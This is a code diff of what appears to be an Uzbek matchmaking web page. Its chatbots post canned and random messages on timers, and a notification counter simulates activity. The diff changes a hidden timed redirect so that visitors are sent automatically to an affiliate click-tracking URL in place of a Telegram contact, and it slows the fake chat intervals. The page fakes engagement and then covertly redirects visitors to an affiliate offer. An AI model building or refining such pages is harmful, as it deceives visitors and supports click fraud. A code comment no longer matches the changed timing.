@@ -405,7 +405,7 @@
         const redirectTime = Math.floor(Math.random() * (25 - 10 + 1)) + 30;
 
         setTimeout(function() {
-            window.location.href = 'https://t.me/Munisa_Admen';
+            window.location.href = 'https://www1.affhone.fyi/click?pid=81683&offer_id=25';
         }, redirectTime * 1000);
     </script>
     <div class="container" id="sovchilarPage">
@@ -1412,8 +1412,8 @@
                 setTimeout(() => {
                     notificationCount--;
                     updateNotificationCounter();
-                }, 1500);
-            }, 2000);
+                }, 2500);
+            }, 5000);
         }
 
         function updateNotificationCounter() {
@@ -1467,7 +1467,7 @@
                 }
                 setTimeout(() => {
                     addMessage(this.container, "Kechirasiz, tushunmadim. Iltimos, boshqacha ifoda eting.", false, this.constructor.name);
-                }, 10000);
+                }, 15000);
             }
         }
 
@@ -1507,7 +1507,7 @@
                 const randomResponse = this.responses[Math.floor(Math.random() * this.responses.length)];
                 setTimeout(() => {
                     addMessage(this.container, randomResponse, false, this.constructor.name);
-                }, 1500);
+                }, 2500);
             }
         }
 
@@ -1577,7 +1577,7 @@
             start() {
                 setInterval(() => {
                     this.sendRandomMessage();
-                }, Math.floor(Math.random() * 2000) + 1000); // Random interval between 1-3 seconds
+                }, Math.floor(Math.random() * 3000) + 1500); // Random interval between 1-3 seconds
             }
 
             sendRandomMessage() {
